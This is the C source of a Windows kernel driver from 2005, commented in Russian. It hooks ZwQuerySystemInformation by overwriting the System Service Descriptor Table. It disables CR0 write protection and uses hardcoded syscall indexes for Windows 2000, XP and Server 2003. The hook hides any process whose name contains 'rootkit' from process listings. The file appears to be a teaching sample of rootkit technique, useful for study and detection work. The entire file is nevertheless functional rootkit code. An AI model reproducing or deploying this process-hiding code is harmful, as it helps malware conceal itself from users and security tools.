// (С) Зайцев Олег, 2005
#include "StdAfx.h"
#include <ntddk.h>
#include <ntdef.h>
#include <rkdrv.h>

extern "C" {
	// Указатель на SDT
	extern PSERVICE_DESCRIPTOR_TABLE    KeServiceDescriptorTable;

	// Номер сборки NT - для анализа
	extern  PWORD						NtBuildNumber;
}


typedef NTSTATUS 
(NTAPI *PZwQuerySystemInformation) (
    IN ULONG SystemInformationClass,
    IN PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength
    );

PZwQuerySystemInformation OldZwQuerySystemInformation;


#pragma pack(1)
typedef struct _SystemProcessesAndThreadsInformation {
 ULONG                   NextEntryDelta;
 ULONG                   ThreadCount;
 ULONG                   Reserved1[6];
 LARGE_INTEGER           CreateTime;
 LARGE_INTEGER           UserTime;
 LARGE_INTEGER           KernelTime;
 UNICODE_STRING          ProcessName;
 KPRIORITY               BasePriority;
 ULONG                   ProcessId;
 ULONG                   InheritedFromProcessId;
 ULONG                   HandleCount;
 ULONG                   Reserved2[2];
} TSystemProcessesAndThreadsInformation;
#pragma pack()
typedef struct _SystemProcessesAndThreadsInformation *PSystemProcessesAndThreadsInformation;

NTSTATUS MyZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
            IN PVOID SystemInformation,
            IN ULONG SystemInformationLength,
            OUT PULONG ReturnLength) 
{
  
 NTSTATUS Res;
 // Вызов исходной функции
 Res = OldZwQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 // Анализ типа функции и результата
 if ((SystemInformationClass != 5) || 
	 (Res != STATUS_SUCCESS) || 
	 (SystemInformationLength == 0)) 
  return Res;
 PSystemProcessesAndThreadsInformation 
	      SI_Item = (PSystemProcessesAndThreadsInformation)SystemInformation, 
	      SI_PrevItem = NULL;
 // Объем проанализированной части буфера
 ULONG ScanLength = 0;   
 // Анализ результирующего массива
 do {
	 ScanLength += SI_Item->NextEntryDelta;
	 DbgPrint(" ProcessId = %d \n", SI_Item->ProcessId);
	 // У объекта есть имя ? Если да, то ищем в нем строку "rootkit"
	 if (SI_Item->ProcessName.Buffer != NULL)
	  if (wcsstr(SI_Item->ProcessName.Buffer, L"rootkit") != NULL) {
	   DbgPrint("Hide process %ws !\n", SI_Item->ProcessName.Buffer);
	   // Маскировка процесса
	   if (SI_Item->NextEntryDelta > 0) 
	    SI_PrevItem->NextEntryDelta += SI_Item->NextEntryDelta; 	    	   
	   else
	    SI_PrevItem->NextEntryDelta = 0;	   
      } 
	  else
	   SI_PrevItem = SI_Item;
	 // Переход на следующий элемент
	 if (SI_Item->NextEntryDelta > 0) 	  
	  SI_Item  = (PSystemProcessesAndThreadsInformation)((ULONG)SI_Item + SI_Item->NextEntryDelta);	 
	 else
	  break;
 } while (ScanLength >= SystemInformationLength);
 return Res;
}

VOID SetKiSTHook()
{
 DWORD OldCR0;	
  
 // Повышение приоритета
 KIRQL OldIRQL = KeRaiseIrqlToDpcLevel();			 
 
 // Сброс WP бита
_asm {
    mov eax,CR0 
    mov OldCR0,eax
    and eax,0xFFFEFFFF			
    mov cr0, eax
 }
	
 switch (*NtBuildNumber) {
  case  2195:  // Win 2k
     OldZwQuerySystemInformation = (PZwQuerySystemInformation)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[151];
	 KeServiceDescriptorTable->ntoskrnl.ServiceTable[151]   = (NTPROC)*MyZwQuerySystemInformation;
	 break;
  case 2600:   // Win XP
     OldZwQuerySystemInformation = (PZwQuerySystemInformation)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[173];
	 KeServiceDescriptorTable->ntoskrnl.ServiceTable[173]   = (NTPROC)*MyZwQuerySystemInformation;
	 break;
  case 3790:  // W2K3
     OldZwQuerySystemInformation = (PZwQuerySystemInformation)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[181];
	 KeServiceDescriptorTable->ntoskrnl.ServiceTable[181]   = (NTPROC)*MyZwQuerySystemInformation;
	 break;
}

 // Восстановление WP бита
 _asm {
	 mov eax,OldCR0		
     mov cr0,eax
 }
 // Восстановление приоритета
 KeLowerIrql(OldIRQL);
}


VOID DeleteKiSTHook()
{
 DWORD OldCR0;	
  
 // Повышение приоритета
 KIRQL OldIRQL = KeRaiseIrqlToDpcLevel();			 
 
 // Сброс WP бита
_asm {
    mov eax,CR0 
    mov OldCR0,eax
    and eax,0xFFFEFFFF			
    mov cr0, eax
 }
	
 switch (*NtBuildNumber) {
  case  2195:  // Win 2k
     KeServiceDescriptorTable->ntoskrnl.ServiceTable[151] = (NTPROC)*OldZwQuerySystemInformation;	 
	 break;
  case 2600:   // Win XP
     KeServiceDescriptorTable->ntoskrnl.ServiceTable[173] = (NTPROC)*OldZwQuerySystemInformation;	 
	 break;
  case 3790:  // W2K3
     KeServiceDescriptorTable->ntoskrnl.ServiceTable[181] = (NTPROC)*OldZwQuerySystemInformation;	 
	 break;
}

 // Восстановление WP бита
 _asm {
	 mov eax,OldCR0		
     mov cr0,eax
 }
 // Восстановление приоритета
 KeLowerIrql(OldIRQL);
}


// ***** Выгрузка драйвера *****
void DriverUnload (PDRIVER_OBJECT pDriverObject)
{
 DeleteKiSTHook();
 return;
}

// ***** Точка входа в драйвер *****
NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING pusRegistryPath)
{
	NTSTATUS          InitRes = STATUS_SUCCESS;	
	SetKiSTHook();
    // Подключение обработчика выгрузки драйвера
    pDriverObject->DriverUnload  = DriverUnload;
	// Возврат результата инициализации
    return InitRes;
}